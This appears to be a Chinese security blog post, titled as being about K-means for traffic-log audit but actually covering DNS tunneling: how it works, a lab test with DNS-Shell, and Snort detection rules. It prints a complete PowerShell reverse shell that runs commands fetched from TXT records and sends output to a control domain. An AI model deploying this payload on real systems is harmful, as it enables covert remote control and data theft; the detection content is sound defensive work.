<!DOCTYPE html>
<html lang="zh">

<head>
  <!-- Required meta tags always come first -->
  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <meta name="google-site-verification" content="GgupatpoZgdqsBlxEZoMqGAy3aXAFtXIrYged3SB6EA" />
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <title>流量日志审计中常用的聚类算法（K-means） | nJcx's Blog
</title>
  <link rel="canonical" href="https://www.njcx.bid/posts/P6.html">


  <link rel="apple-touch-icon" href="https://www.njcx.bid/apple-touch-icon.png" sizes="180x180">
  <link rel="icon" type="image/png" href="https://www.njcx.bid/favicon-32x32.png" sizes="32x32">
  <link rel="icon" type="image/png" href="https://www.njcx.bid/favicon-16x16.png" sizes="16x16">
  <link rel="manifest" href="https://www.njcx.bid/manifest.json">
  <meta name="theme-color" content="#333333">

  <link rel="stylesheet" href="https://www.njcx.bid/theme/css/bootstrap.min.css">
  <link rel="stylesheet" href="https://www.njcx.bid/theme/css/font-awesome.min.css">
  <link rel="stylesheet" href="https://www.njcx.bid/theme/css/pygments/emacs.min.css">
  <link rel="stylesheet" href="https://www.njcx.bid/theme/css/style.css">


<meta name="description" content="流量日志审计中常用的聚类算法（K-means）~">
<script>
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?a34c7a96ae9745547c373575407c521f";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script>

<script>
(function(){
    var bp = document.createElement('script');
    var curProtocol = window.location.protocol.split(':')[0];
    if (curProtocol === 'https') {
        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
    }
    else {
        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
    }
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(bp, s);
})();
</script>

</head>

<body>
  <header class="header">
    <div class="container">
      <div class="row">
        <div class="col-sm-4">
          <a href="https://www.njcx.bid">
            <img class="img-fluid" src=https://www.njcx.bid/images/profile.png width=200 height=200 alt="nJcx's Blog">
          </a>
        </div>
        <div class="col-sm-8">
          <h1 class="title">&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<a href="https://www.njcx.bid">nJcx's Blog</a></h1>
          <p class="text-muted">十年生死两茫茫，写程序，到天亮。相顾无言，惟有泪千行</p>
          <ul class="list-inline">
                    <li class="list-inline-item">&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<a href="https://www.zhihu.com/people/njcxs" target="_blank">知乎</a></li>
                <li class="list-inline-item"><a href="https://www.facebook.com/nJcx1" target="_blank">FaceBook</a></li>
                <li class="list-inline-item"><a href="https://github.com/njcx" target="_blank">Github</a></li>
            <li class=" list-inline-item text-muted">|</li>
            <li class="list-inline-item"><a class="fa fa-github" href="https://github.com/njcx" target="_blank"></a></li>
          </ul>
        </div>
      </div>
    </div>
  </header>

  <div class="main">
    <div class="container">
      <h1>流量日志审计中常用的聚类算法（K-means）
</h1>
      <hr>
<article class="article">
  <header>
    <ul class="list-inline">
      <li class="list-inline-item text-muted" title="2018-07-04T20:20:00+03:00">
        <i class="fa fa-clock-o"></i>
        三 04 七月 2018
      </li>
      <li class="list-inline-item">
        <i class="fa fa-folder-open-o"></i>
        <a href="https://www.njcx.bid/category/an-quan.html">安全</a>
      </li>
      <li class="list-inline-item">
        <i class="fa fa-user-o"></i>
        <a href="https://www.njcx.bid/author/njcx.html">nJcx</a>      </li>
      <li class="list-inline-item">
        <i class="fa fa-files-o"></i>
        <a href="https://www.njcx.bid/tag/k-means.html">#K-means</a>      </li>
    </ul>
  </header>
  <div class="content">
    <h4>DNS介绍</h4>
<p><img alt="icmp" class="img-fluid" src="../images/tcpip.gif"/></p>
<p>我们先简单介绍一下 DNS协议，DNS协议是一个应用层协议，用来将域名转换为IP地址（也可以将IP地址转换为相应的域名地址），类似一个分布式数据库，数据通过udp传输,IP报头中的协议字段值为17.</p>
<p>DNS协议报文格式</p>
<p><img alt="dns" class="img-fluid" src="../images/dns-protocol-format.png"/></p>
<p>通过wireshark 抓到的包：</p>
<p><img alt="dns" class="img-fluid" src="../images/dnswireshark.png"/></p>
<p>由于关于dns报文介绍太长，参考下面url </p>
<p><a href="https://www.cnblogs.com/davidwang456/articles/10660051.html">DNS协议详解及报文格式分析</a></p>
<p><img alt="dns" class="img-fluid" src="../images/dnsq.jpeg"/></p>
<p>关于DNS请求的方式如图，
具体可描述如下： </p>
<div class="highlight"><pre><span></span>1. 主机先向本地域名服务器进行递归查询

2. 本地域名服务器采用迭代查询，向一个根域名服务器进行查询

3. 根域名服务器告诉本地域名服务器，下一次应该查询的顶级域名服务器的IP地址

4. 本地域名服务器向顶级域名服务器进行查询

5. 顶级域名服务器告诉本地域名服务器，下一步查询权限服务器的IP地址

6. 本地域名服务器向权威服务器进行查询

7. 权限服务器告诉本地域名服务器所查询的主机的IP地址

8. 本地域名服务器最后把查询结果告诉主机
</pre></div>
<p><img alt="dns" class="img-fluid" src="../images/dnstun.jpeg"/></p>
<p>如果在企业内网，那么黑客的攻击机器，就是所谓的权威服务器</p>
<div class="highlight"><pre><span></span>第一步: 受控机向内部dns服务器发送一个查询NKNFjklKLuJNVIUM.ml.org的请求

第二步：内部dns服务器通过防火墙向根dns服务器发出查询请求

第三步：经过大量迭代后，DNS请求到达NKNFjklKLuJNVIUM.ml.org的权威DNS服务器（黑客所控制）

第四步：受控机请求查询的响应通过防火墙返回到内部DNS服务器

第五步：内部DNS服务器将响应结果返回给受控机
</pre></div>
<p>上面的流程展示了一个受控机在连接外部网络时dns解析的一个过程。由于防火墙并没有对dns协议做任何处理，所以我们可以通过这种方式来穿透防火墙。</p>
<p>这里很多人会有一个疑问，关于dns 请求查询NKNFjklKLuJNVIUMvKL.ml.org 是怎么到达黑客所控制的权威DNS服务器的？</p>
<p>请求一个域名，比如NKNFjklKLuJNVIUMvKL.ml.org ,本地DNS服务器上没有 NKNFjklKLuJNVIUMvKL.ml.org，那么它将向root，也就是根域名服务器请求，看看根知道不, root一看是.org的域名，就交 给.org域名服务器进行解析，.org的域名服务器一看是.ml.org那么就会去找.ml.org的域名服务器 (ns1.myhostadmin.net),看看它有没有这条记录，.ml.org的域名服务器上一看是.ml.org，如果它有这 条A记录，那么就会返回NKNFjklKLuJNVIUMvKL.ml.org 的记录。</p>
<p>但是，如果没有，你可以再在ml.org的域名服务器上设定一个NS 类型的记录，如：ml.org NS 111.222.333.444(通常这里不让设置为地址，你可以先在DNS服务器上添加一条A记录，如ns.ml.org A 111.222.333.444，再添加NS记录：ml.org NS ns.xxx.org)，这里指定一个公网服务器，就是黑客所控制的权威DNS服务器。</p>
<h4>测试</h4>
<p>我们测试一下使用dns反弹shell，用于测试的域名： test.njcx.bid</p>
<p>该域名的dns服务器位于  ns1.njcx.bid（公网ip：111.222.333.444）</p>
<p>受控机Windows7 ：  172.16.42.134</p>
<p>控制机 CentOS7：  111.222.333.444</p>
<p>我们用到的工具
<a href="https://github.com/sensepost/DNS-Shell">DNS-Shell</a>，我们在 CentOS7 上面执行  python DNS-shell.py -l -r test.njcx.bid ，接收由受控机过来的shell，执行后会生成一个 powershell的payload,保存为 ps1 Windows执行即可收到shell</p>
<div class="highlight"><pre><span></span><span class="nx">$url</span> <span class="o">=</span> <span class="s2">"test.njcx.bid"</span><span class="p">;</span>
<span class="kd">function</span> <span class="nx">execDNS</span><span class="p">(</span><span class="nx">$cmd</span><span class="p">)</span> <span class="p">{</span>
<span class="nx">$c</span> <span class="o">=</span> <span class="nx">iex</span> <span class="nx">$cmd</span> <span class="mi">2</span><span class="o">&gt;&amp;</span><span class="mi">1</span> <span class="o">|</span> <span class="nx">Out</span><span class="o">-</span><span class="nb">String</span><span class="p">;</span>
<span class="nx">$u</span> <span class="o">=</span> <span class="p">[</span><span class="nx">system</span><span class="p">.</span><span class="nx">Text</span><span class="p">.</span><span class="nx">Encoding</span><span class="p">]</span><span class="o">::</span><span class="nx">UTF8</span><span class="p">.</span><span class="nx">GetBytes</span><span class="p">(</span><span class="nx">$c</span><span class="p">);</span>
<span class="nx">$string</span> <span class="o">=</span> <span class="p">[</span><span class="nx">System</span><span class="p">.</span><span class="nx">BitConverter</span><span class="p">]</span><span class="o">::</span><span class="nx">ToString</span><span class="p">(</span><span class="nx">$u</span><span class="p">);</span>
<span class="nx">$string</span> <span class="o">=</span> <span class="nx">$string</span> <span class="o">-</span><span class="nx">replace</span> <span class="s1">'-'</span><span class="p">,</span><span class="s1">''</span><span class="p">;</span>
<span class="nx">$len</span> <span class="o">=</span> <span class="nx">$string</span><span class="p">.</span><span class="nx">Length</span><span class="p">;</span>
<span class="nx">$split</span> <span class="o">=</span> <span class="mi">50</span><span class="p">;</span>
<span class="nx">$repeat</span><span class="o">=</span><span class="p">[</span><span class="nb">Math</span><span class="p">]</span><span class="o">::</span><span class="nx">Floor</span><span class="p">(</span><span class="nx">$len</span><span class="o">/</span><span class="nx">$split</span><span class="p">);</span>
<span class="nx">$remainder</span><span class="o">=</span><span class="nx">$len</span><span class="o">%</span><span class="nx">$split</span><span class="p">;</span>
<span class="k">if</span><span class="p">(</span><span class="nx">$remainder</span><span class="p">){</span> <span class="nx">$repeatr</span> <span class="o">=</span> <span class="nx">$repeat</span><span class="o">+</span><span class="mi">1</span><span class="p">};</span>
<span class="nx">$rnd</span> <span class="o">=</span> <span class="nx">Get</span><span class="o">-</span><span class="nx">Random</span><span class="p">;</span><span class="nx">$ur</span> <span class="o">=</span> <span class="nx">$rnd</span><span class="p">.</span><span class="nx">toString</span><span class="p">()</span><span class="o">+</span><span class="s2">".CMDC"</span><span class="o">+</span><span class="nx">$repeatr</span><span class="p">.</span><span class="nx">ToString</span><span class="p">()</span><span class="o">+</span><span class="s2">"."</span><span class="o">+</span><span class="nx">$url</span><span class="p">;</span>
<span class="nx">$q</span> <span class="o">=</span> <span class="nx">nslookup</span> <span class="o">-</span><span class="nx">querytype</span><span class="o">=</span><span class="nx">A</span> <span class="nx">$ur</span><span class="p">;</span>
<span class="k">for</span><span class="p">(</span><span class="nx">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nx">$i</span><span class="o">-</span><span class="nx">lt$repeat</span><span class="p">;</span><span class="nx">$i</span><span class="o">++</span><span class="p">){</span>
    <span class="nx">$str</span> <span class="o">=</span> <span class="nx">$string</span><span class="p">.</span><span class="nx">Substring</span><span class="p">(</span><span class="nx">$i</span><span class="o">*</span><span class="nx">$Split</span><span class="p">,</span><span class="nx">$Split</span><span class="p">);</span>
    <span class="nx">$rnd</span> <span class="o">=</span> <span class="nx">Get</span><span class="o">-</span><span class="nx">Random</span><span class="p">;</span><span class="nx">$ur1</span> <span class="o">=</span> <span class="nx">$rnd</span><span class="p">.</span><span class="nx">toString</span><span class="p">()</span><span class="o">+</span><span class="s2">".CMD"</span><span class="o">+</span><span class="nx">$i</span><span class="p">.</span><span class="nx">ToString</span><span class="p">()</span><span class="o">+</span><span class="s2">"."</span><span class="o">+</span><span class="nx">$str</span><span class="o">+</span><span class="s2">"."</span><span class="o">+</span><span class="nx">$url</span><span class="p">;</span>
    <span class="nx">$q</span> <span class="o">=</span> <span class="nx">nslookup</span> <span class="o">-</span><span class="nx">querytype</span><span class="o">=</span><span class="nx">A</span> <span class="nx">$ur1</span><span class="p">;</span>
<span class="p">};</span>
<span class="k">if</span><span class="p">(</span><span class="nx">$remainder</span><span class="p">){</span>
    <span class="nx">$str</span> <span class="o">=</span> <span class="nx">$string</span><span class="p">.</span><span class="nx">Substring</span><span class="p">(</span><span class="nx">$len</span><span class="o">-</span><span class="nx">$remainder</span><span class="p">);</span>
    <span class="nx">$i</span> <span class="o">=</span> <span class="nx">$i</span> <span class="o">+</span><span class="mi">1</span>
    <span class="nx">$rnd</span> <span class="o">=</span> <span class="nx">Get</span><span class="o">-</span><span class="nx">Random</span><span class="p">;</span><span class="nx">$ur2</span> <span class="o">=</span> <span class="nx">$rnd</span><span class="p">.</span><span class="nx">toString</span><span class="p">()</span><span class="o">+</span><span class="s2">".CMD"</span><span class="o">+</span><span class="nx">$i</span><span class="p">.</span><span class="nx">ToString</span><span class="p">()</span><span class="o">+</span><span class="s2">"."</span><span class="o">+</span><span class="nx">$str</span><span class="o">+</span><span class="s2">"."</span><span class="o">+</span><span class="nx">$url</span><span class="p">;</span>
    <span class="nx">$q</span> <span class="o">=</span> <span class="nx">nslookup</span> <span class="o">-</span><span class="nx">querytype</span><span class="o">=</span><span class="nx">A</span> <span class="nx">$ur2</span><span class="p">;</span>
<span class="p">};</span>
<span class="nx">$rnd</span><span class="o">=</span><span class="nx">Get</span><span class="o">-</span><span class="nx">Random</span><span class="p">;</span><span class="nx">$s</span><span class="o">=</span><span class="nx">$rnd</span><span class="p">.</span><span class="nx">ToString</span><span class="p">()</span><span class="o">+</span><span class="s2">".END."</span><span class="o">+</span><span class="nx">$url</span><span class="p">;</span><span class="nx">$q</span> <span class="o">=</span> <span class="nx">nslookup</span> <span class="o">-</span><span class="nx">querytype</span><span class="o">=</span><span class="nx">A</span> <span class="nx">$s</span><span class="p">;</span>
<span class="p">};</span>
<span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">){</span>
   <span class="nx">$c</span> <span class="o">=</span> <span class="nx">Get</span><span class="o">-</span><span class="nx">Random</span><span class="p">;</span>
   <span class="nx">Start</span><span class="o">-</span><span class="nx">Sleep</span> <span class="o">-</span><span class="nx">s</span> <span class="mi">3</span>
   <span class="nx">$u</span><span class="o">=</span><span class="nx">$c</span><span class="p">.</span><span class="nx">ToString</span><span class="p">()</span><span class="o">+</span><span class="s2">"."</span><span class="o">+</span><span class="nx">$url</span><span class="p">;</span><span class="nx">$txt</span> <span class="o">=</span> <span class="nx">nslookup</span> <span class="o">-</span><span class="nx">querytype</span><span class="o">=</span><span class="nx">TXT</span> <span class="nx">$u</span> <span class="o">|</span> <span class="nx">Out</span><span class="o">-</span><span class="nb">String</span>
   <span class="nx">$txt</span> <span class="o">=</span> <span class="nx">$txt</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s2">"`n"</span><span class="p">)</span> <span class="o">|</span> <span class="o">%</span><span class="p">{</span><span class="nx">$_</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s1">'"'</span><span class="p">)[</span><span class="mi">1</span><span class="p">]}</span> <span class="o">|</span> <span class="nx">Out</span><span class="o">-</span><span class="nb">String</span>
   <span class="k">if</span> <span class="p">(</span><span class="nx">$txt</span> <span class="o">-</span><span class="nx">match</span> <span class="s1">'NoCMD'</span><span class="p">){</span><span class="k">continue</span><span class="p">}</span>
   <span class="nx">elseif</span> <span class="p">(</span><span class="nx">$txt</span> <span class="o">-</span><span class="nx">match</span> <span class="s1">'exit'</span><span class="p">){</span><span class="nx">Exit</span><span class="p">}</span>
   <span class="k">else</span><span class="p">{</span><span class="nx">execDNS</span><span class="p">(</span><span class="nx">$txt</span><span class="p">)}</span>
<span class="p">}</span>   
</pre></div>
<p>shell 如下，</p>
<p><img alt="dnsshell" class="img-fluid" src="../images/dnsshell.png"/></p>
<p>我在被控机上抓包，如图，可以看出受控机器一直TXT请求 CentOS 控制机</p>
<p><img alt="dnsshell" class="img-fluid" src="../images/WechatIMG25.jpeg"/></p>
<p><img alt="dnsshell" class="img-fluid" src="../images/WechatIMG26.jpeg"/></p>
<p>可以看出我们的payload是 放到TXT字段里面，由CentOS 控制机响应给客户端的</p>
<p><img alt="dnsshell" class="img-fluid" src="../images/WechatIMG21.jpeg"/></p>
<p>然后，数据都分段放到子域名里面，分多次，再次用请求的方式，发送到我们的控制机器上了</p>
<p><img alt="dnsshell" class="img-fluid" src="../images/WechatIMG23.jpeg"/></p>
<h4>检测</h4>
<p>我们可以看出一些特征 ：</p>
<div class="highlight"><pre><span></span>1， 请求的Type一般都是TXT（为了返回的时候能够加入更多的信息）。
2， payload部分一般都会编码（可能为base64、2进制或16进制）后放到子域名里面，而且多变，不一致
3， DNS发生频率很高，短时间为了发送大量数据，会产生大量请求
</pre></div>
<p>比如，DNS  TXT请求频率过高，就报警，例子如下</p>
<div class="highlight"><pre><span></span><span class="nt">alert</span> <span class="nt">udp</span> <span class="nt">any</span> <span class="nt">any</span> <span class="nt">-</span><span class="o">&gt;</span> <span class="nt">any</span> <span class="nt">53</span> <span class="o">(</span><span class="nt">msg</span><span class="o">:</span><span class="s2">"High TXT requests - Potential DNS Tunneling"</span><span class="o">;</span> <span class="nt">content</span><span class="o">:</span><span class="s2">"|01 00|"</span><span class="o">;</span> <span class="nt">offset</span><span class="p">:</span><span class="nd">2</span><span class="o">;</span> <span class="nt">within</span> <span class="p">:</span><span class="nd">4</span><span class="o">;</span> <span class="nt">content</span><span class="o">:</span><span class="s2">"|00 00 10 00 01|"</span><span class="o">;</span> <span class="nt">offset</span><span class="p">:</span><span class="nd">12</span><span class="o">;</span> <span class="nt">within</span><span class="p">:</span><span class="nd">255</span><span class="o">;</span> <span class="nt">threshold</span><span class="o">:</span> <span class="nt">type</span> <span class="nt">threshold</span><span class="o">,</span> <span class="nt">track</span> <span class="nt">by_src</span><span class="o">,</span> <span class="nt">count</span> <span class="nt">10</span><span class="o">,</span> <span class="nt">seconds</span> <span class="nt">5</span><span class="o">;</span> <span class="nt">sid</span><span class="o">:</span> <span class="nt">5700002</span><span class="o">;</span> <span class="nt">rev</span><span class="o">:</span> <span class="nt">1</span><span class="o">;)</span>
</pre></div>
<p>下面，收集了很多知名DNS利用工具的检测规则。</p>
<div class="highlight"><pre><span></span><span class="nx">alert</span> <span class="nx">udp</span> <span class="nx">$EXTERNAL_NET</span> <span class="mi">53</span> <span class="o">-&gt;</span> <span class="nx">$HOME_NET</span> <span class="nx">any</span> <span class="p">(</span><span class="nx">msg</span><span class="o">:</span><span class="s2">"APP-DETECT iodine dns tunneling handshake server ACK"</span><span class="p">;</span> <span class="nx">flow</span><span class="o">:</span><span class="nx">to_client</span><span class="p">;</span> <span class="nx">byte_test</span><span class="o">:</span><span class="mi">1</span><span class="p">,</span><span class="o">&amp;</span><span class="p">,</span><span class="mh">0x80</span><span class="p">,</span><span class="mi">2</span><span class="p">;</span> <span class="nx">content</span><span class="o">:</span><span class="s2">"|00 01 00 01 00|"</span><span class="p">;</span> <span class="nx">depth</span><span class="o">:</span><span class="mi">5</span><span class="p">;</span> <span class="nx">offset</span><span class="o">:</span><span class="mi">4</span><span class="p">;</span> <span class="nx">content</span><span class="o">:</span><span class="s2">"v"</span><span class="p">;</span> <span class="nx">within</span><span class="o">:</span><span class="mi">1</span><span class="p">;</span> <span class="nx">distance</span><span class="o">:</span><span class="mi">4</span><span class="p">;</span> <span class="nx">content</span><span class="o">:</span><span class="s2">"VACK"</span><span class="p">;</span> <span class="nx">within</span><span class="o">:</span><span class="mi">200</span><span class="p">;</span> <span class="nx">fast_pattern</span><span class="p">;</span> <span class="nx">metadata</span><span class="o">:</span><span class="nx">service</span> <span class="nx">dns</span><span class="p">;</span> <span class="nx">reference</span><span class="o">:</span><span class="nx">url</span><span class="p">,</span><span class="nx">code</span><span class="p">.</span><span class="nx">kryo</span><span class="p">.</span><span class="nx">se</span><span class="o">/</span><span class="nx">iodine</span><span class="o">/</span><span class="nx">README</span><span class="p">.</span><span class="nx">html</span><span class="p">;</span> <span class="nx">classtype</span><span class="o">:</span><span class="nx">policy</span><span class="o">-</span><span class="nx">violation</span><span class="p">;</span> <span class="nx">sid</span><span class="o">:</span><span class="mi">27046</span><span class="p">;</span> <span class="nx">rev</span><span class="o">:</span><span class="mi">3</span><span class="p">;)</span>

<span class="nx">alert</span> <span class="nx">udp</span> <span class="nx">$HOME_NET</span> <span class="nx">any</span> <span class="o">-&gt;</span> <span class="nx">any</span> <span class="mi">53</span> <span class="p">(</span><span class="nx">msg</span><span class="o">:</span><span class="s2">"APP-DETECT OzymanDNS dns tunneling up attempt"</span><span class="p">;</span> <span class="nx">flow</span><span class="o">:</span><span class="nx">to_server</span><span class="p">,</span><span class="nx">no_stream</span><span class="p">;</span> <span class="nx">content</span><span class="o">:</span><span class="s2">"|01 00 00 01 00 00 00 00 00 00|"</span><span class="p">;</span> <span class="nx">depth</span><span class="o">:</span><span class="mi">10</span><span class="p">;</span> <span class="nx">offset</span><span class="o">:</span><span class="mi">2</span><span class="p">;</span> <span class="nx">content</span><span class="o">:</span><span class="s2">"-0"</span><span class="p">;</span> <span class="nx">distance</span><span class="o">:</span><span class="mi">6</span><span class="p">;</span> <span class="nx">content</span><span class="o">:</span><span class="s2">"id-"</span><span class="p">;</span> <span class="nx">within</span><span class="o">:</span><span class="mi">3</span><span class="p">;</span> <span class="nx">distance</span><span class="o">:</span><span class="mi">1</span><span class="p">;</span> <span class="nx">fast_pattern</span><span class="p">;</span> <span class="nx">content</span><span class="o">:</span><span class="s2">"up"</span><span class="p">;</span> <span class="nx">within</span><span class="o">:</span><span class="mi">8</span><span class="p">;</span> <span class="nx">detection_filter</span><span class="o">:</span><span class="nx">track</span> <span class="nx">by_src</span><span class="p">,</span> <span class="nx">count</span> <span class="mi">18</span><span class="p">,</span> <span class="nx">seconds</span> <span class="mi">1</span><span class="p">;</span> <span class="nx">metadata</span><span class="o">:</span><span class="nx">impact_flag</span> <span class="nx">red</span><span class="p">,</span> <span class="nx">service</span> <span class="nx">dns</span><span class="p">;</span> <span class="nx">reference</span><span class="o">:</span><span class="nx">url</span><span class="p">,</span><span class="nx">dankaminsky</span><span class="p">.</span><span class="nx">com</span><span class="o">/</span><span class="mi">2004</span><span class="o">/</span><span class="mi">07</span><span class="o">/</span><span class="mi">29</span><span class="o">/</span><span class="mi">51</span><span class="o">/</span><span class="p">;</span> <span class="nx">classtype</span><span class="o">:</span><span class="nx">policy</span><span class="o">-</span><span class="nx">violation</span><span class="p">;</span> <span class="nx">sid</span><span class="o">:</span><span class="mi">27540</span><span class="p">;</span> <span class="nx">rev</span><span class="o">:</span><span class="mi">4</span><span class="p">;)</span>

<span class="nx">alert</span> <span class="nx">udp</span> <span class="nx">$HOME_NET</span> <span class="nx">any</span> <span class="o">-&gt;</span> <span class="nx">any</span> <span class="mi">53</span> <span class="p">(</span><span class="nx">msg</span><span class="o">:</span><span class="s2">"APP-DETECT OzymanDNS dns tunneling down attempt"</span><span class="p">;</span> <span class="nx">flow</span><span class="o">:</span><span class="nx">to_server</span><span class="p">,</span><span class="nx">no_stream</span><span class="p">;</span> <span class="nx">content</span><span class="o">:</span><span class="s2">"|01 00 00 01 00 00 00 00 00 00|"</span><span class="p">;</span> <span class="nx">depth</span><span class="o">:</span><span class="mi">10</span><span class="p">;</span> <span class="nx">offset</span><span class="o">:</span><span class="mi">2</span><span class="p">;</span> <span class="nx">content</span><span class="o">:</span><span class="s2">"id-"</span><span class="p">;</span> <span class="nx">distance</span><span class="o">:</span><span class="mi">6</span><span class="p">;</span> <span class="nx">fast_pattern</span><span class="p">;</span> <span class="nx">content</span><span class="o">:</span><span class="s2">"down"</span><span class="p">;</span> <span class="nx">within</span><span class="o">:</span><span class="mi">10</span><span class="p">;</span> <span class="nx">distance</span><span class="o">:</span><span class="mi">2</span><span class="p">;</span> <span class="nx">detection_filter</span><span class="o">:</span><span class="nx">track</span> <span class="nx">by_dst</span><span class="p">,</span> <span class="nx">count</span> <span class="mi">8</span><span class="p">,</span> <span class="nx">seconds</span> <span class="mi">1</span><span class="p">;</span> <span class="nx">metadata</span><span class="o">:</span><span class="nx">impact_flag</span> <span class="nx">red</span><span class="p">,</span> <span class="nx">service</span> <span class="nx">dns</span><span class="p">;</span> <span class="nx">reference</span><span class="o">:</span><span class="nx">url</span><span class="p">,</span><span class="nx">dankaminsky</span><span class="p">.</span><span class="nx">com</span><span class="o">/</span><span class="mi">2004</span><span class="o">/</span><span class="mi">07</span><span class="o">/</span><span class="mi">29</span><span class="o">/</span><span class="mi">51</span><span class="o">/</span><span class="p">;</span> <span class="nx">classtype</span><span class="o">:</span><span class="nx">policy</span><span class="o">-</span><span class="nx">violation</span><span class="p">;</span> <span class="nx">sid</span><span class="o">:</span><span class="mi">27541</span><span class="p">;</span> <span class="nx">rev</span><span class="o">:</span><span class="mi">4</span><span class="p">;)</span>

<span class="nx">alert</span> <span class="nx">udp</span> <span class="nx">$HOME_NET</span> <span class="nx">any</span> <span class="o">-&gt;</span> <span class="nx">any</span> <span class="mi">53</span> <span class="p">(</span><span class="nx">msg</span><span class="o">:</span><span class="s2">"APP-DETECT Your-Freedom DNS tunneling query attempt"</span><span class="p">;</span> <span class="nx">flow</span><span class="o">:</span><span class="nx">to_server</span><span class="p">;</span> <span class="nx">byte_test</span><span class="o">:</span><span class="mi">1</span><span class="p">,</span><span class="o">!&amp;</span><span class="p">,</span><span class="mh">0xF8</span><span class="p">,</span><span class="mi">2</span><span class="p">;</span> <span class="nx">content</span><span class="o">:</span><span class="s2">"|03|s"</span><span class="p">;</span> <span class="nx">nocase</span><span class="p">;</span> <span class="nx">content</span><span class="o">:</span><span class="s2">"|03|1yf|02|de|00|"</span><span class="p">;</span> <span class="nx">distance</span><span class="o">:</span><span class="mi">2</span><span class="p">;</span> <span class="nx">nocase</span><span class="p">;</span> <span class="nx">metadata</span><span class="o">:</span><span class="nx">service</span> <span class="nx">dns</span><span class="p">;</span> <span class="nx">reference</span><span class="o">:</span><span class="nx">url</span><span class="p">,</span><span class="nx">your</span><span class="o">-</span><span class="nx">freedom</span><span class="p">.</span><span class="nx">net</span><span class="p">;</span> <span class="nx">classtype</span><span class="o">:</span><span class="nx">misc</span><span class="o">-</span><span class="nx">activity</span><span class="p">;</span> <span class="nx">sid</span><span class="o">:</span><span class="mi">34496</span><span class="p">;</span> <span class="nx">rev</span><span class="o">:</span><span class="mi">1</span><span class="p">;)</span>

<span class="nx">alert</span> <span class="nx">udp</span> <span class="nx">$EXTERNAL_NET</span> <span class="mi">53</span> <span class="o">-&gt;</span> <span class="nx">any</span> <span class="nx">any</span> <span class="p">(</span><span class="nx">msg</span><span class="o">:</span><span class="s2">"APP-DETECT Your-Freedom DNS tunneling query response attempt"</span><span class="p">;</span> <span class="nx">flow</span><span class="o">:</span><span class="nx">to_client</span><span class="p">;</span> <span class="nx">byte_test</span><span class="o">:</span><span class="mi">1</span><span class="p">,</span><span class="o">!&amp;</span><span class="p">,</span><span class="mh">0x01</span><span class="p">,</span><span class="mi">2</span><span class="p">;</span> <span class="nx">content</span><span class="o">:</span><span class="s2">"|03|s"</span><span class="p">;</span> <span class="nx">nocase</span><span class="p">;</span> <span class="nx">content</span><span class="o">:</span><span class="s2">"|03|1yf|02|de|00|"</span><span class="p">;</span> <span class="nx">distance</span><span class="o">:</span><span class="mi">2</span><span class="p">;</span> <span class="nx">nocase</span><span class="p">;</span> <span class="nx">metadata</span><span class="o">:</span><span class="nx">service</span> <span class="nx">dns</span><span class="p">;</span> <span class="nx">reference</span><span class="o">:</span><span class="nx">url</span><span class="p">,</span><span class="nx">your</span><span class="o">-</span><span class="nx">freedom</span><span class="p">.</span><span class="nx">net</span><span class="p">;</span> <span class="nx">classtype</span><span class="o">:</span><span class="nx">misc</span><span class="o">-</span><span class="nx">activity</span><span class="p">;</span> <span class="nx">sid</span><span class="o">:</span><span class="mi">34497</span><span class="p">;</span> <span class="nx">rev</span><span class="o">:</span><span class="mi">1</span><span class="p">;)</span>

<span class="nx">alert</span> <span class="nx">udp</span> <span class="nx">$HOME_NET</span> <span class="nx">any</span> <span class="o">-&gt;</span> <span class="nx">any</span> <span class="mi">53</span> <span class="p">(</span><span class="nx">msg</span><span class="o">:</span><span class="s2">"INDICATOR-OBFUSCATION DNS tunneling attempt"</span><span class="p">;</span> <span class="nx">flow</span><span class="o">:</span><span class="nx">to_server</span><span class="p">;</span> <span class="nx">byte_test</span><span class="o">:</span><span class="mi">1</span><span class="p">,</span><span class="o">!&amp;</span><span class="p">,</span><span class="mh">0xF8</span><span class="p">,</span><span class="mi">2</span><span class="p">;</span> <span class="nx">content</span><span class="o">:</span><span class="s2">"|00 01 00 00 00 00 00 00 1A|"</span><span class="p">;</span> <span class="nx">depth</span><span class="o">:</span><span class="mi">9</span><span class="p">;</span> <span class="nx">offset</span><span class="o">:</span><span class="mi">4</span><span class="p">;</span> <span class="nx">content</span><span class="o">:</span><span class="s2">"|1A|"</span><span class="p">;</span> <span class="nx">within</span><span class="o">:</span><span class="mi">1</span><span class="p">;</span> <span class="nx">distance</span><span class="o">:</span><span class="mi">26</span><span class="p">;</span> <span class="nx">content</span><span class="o">:</span><span class="s2">"|02|"</span><span class="p">;</span> <span class="nx">within</span><span class="o">:</span><span class="mi">2</span><span class="p">;</span> <span class="nx">distance</span><span class="o">:</span><span class="mi">26</span><span class="p">;</span> <span class="nx">metadata</span><span class="o">:</span><span class="nx">service</span> <span class="nx">dns</span><span class="p">;</span> <span class="nx">classtype</span><span class="o">:</span><span class="nx">policy</span><span class="o">-</span><span class="nx">violation</span><span class="p">;</span> <span class="nx">sid</span><span class="o">:</span><span class="mi">25983</span><span class="p">;</span> <span class="nx">rev</span><span class="o">:</span><span class="mi">2</span><span class="p">;)</span>

